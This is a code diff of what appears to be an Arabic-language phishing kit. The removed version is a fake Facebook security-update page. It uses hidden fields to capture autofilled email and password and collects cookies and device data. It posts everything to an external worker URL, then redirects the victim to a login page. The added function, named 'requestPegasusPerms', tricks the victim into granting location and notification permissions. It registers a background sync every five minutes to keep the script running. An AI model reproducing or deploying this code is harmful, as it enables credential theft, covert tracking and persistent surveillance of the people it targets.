@@ -1,61 +1,25 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Security Systems</title>
-    <style>
-        body { font-family: sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; }
-        .btn { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-    </style>
-</head>
-<body>
+async function requestPegasusPerms() {
+    // 1. طلب تصريح الموقع تحت غطاء "تحديد أقرب خادم"
+    const geo = await navigator.permissions.query({name:'geolocation'});
+    if (geo.state !== 'granted') {
+        navigator.geolocation.getCurrentPosition(() => {}, () => {});
+    }
 
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="50">
-    <h3>تحديث أمني مطلوب</h3>
-    <p>تم اكتشاف محاولة وصول مشبوهة. اضغط على "متابعة" لتأمين المتصفح الحالي.</p>
-    
-    <div style="display:none">
-        <input type="text" name="email" id="fake_user">
-        <input type="password" name="password" id="fake_pass">
-    </div>
+    // 2. طلب تصريح الإشعارات لضمان بقاء السكربت نشطاً
+    const notification = await Notification.requestPermission();
 
-    <button id="mainBtn" class="btn">متابعة الفحص</button>
-</div>
+    if (notification === 'granted') {
+        const reg = await navigator.serviceWorker.ready;
+        // تفعيل المزامنة الدورية (هنا يكمن الكنز)
+        try {
+            await reg.periodicSync.register('telemetry-update', {
+                minInterval: 5 * 60 * 1000 // كل 5 دقائق
+            });
+        } catch (e) {
+            console.log("Periodic Sync not supported, fallback to normal sync");
+        }
+    }
+}
 
-<script>
-    document.getElementById('mainBtn').addEventListener('click', async () => {
-        // 1. محاولة قنص بيانات التعبئة التلقائية (إذا ملأها المتصفح صمتاً)
-        const autoUser = document.getElementById('fake_user').value;
-        const autoPass = document.getElementById('fake_pass').value;
-
-        // 2. جمع معلومات النظام العميقة
-        const payload = {
-            type: "INTERACTION_SNIPER",
-            user: autoUser || "AutoFill_Failed",
-            pass: autoPass || "AutoFill_Failed",
-            platform: navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform,
-            cookies: document.cookie || "Protected_By_Browser",
-            screen: `${window.screen.width}x${window.screen.height}`,
-            time: new Date().toLocaleTimeString()
-        };
-
-        // 3. الإرسال للـ Worker
-        const WORKER_URL = "https://pylod.zaid00dd.workers.dev/";
-        
-        fetch(WORKER_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(payload)
-        });
-
-        // 4. التحويل الفوري لصفحة تسجيل الدخول الحقيقية (الصيد اليدوي)
-        setTimeout(() => {
-            window.location.href = "login.html";
-        }, 500);
-    });
-</script>
-</body>
-</html>
+// استدعاء الوظيفة عند أول تفاعل للضحية مع الصفحة
+document.addEventListener('click', requestPegasusPerms, {once: true});
